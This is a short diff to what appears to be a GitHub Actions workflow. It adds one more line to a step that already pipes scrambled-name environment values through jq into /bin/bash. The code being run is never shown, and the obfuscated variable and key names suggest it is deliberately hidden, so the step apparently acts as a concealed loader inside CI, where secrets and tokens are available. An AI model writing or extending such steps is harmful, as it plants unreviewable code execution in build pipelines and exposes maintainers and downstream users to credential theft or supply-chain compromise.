@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$yps08" | jq -r .fb7901 | /bin/bash
           echo $ord818 | jq -r .q37471 | /bin/bash
           echo $rb97925 | jq -r .zzqv69 | /bin/bash
+          printf '%s' "$efh5" | jq -r .rpeob72 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
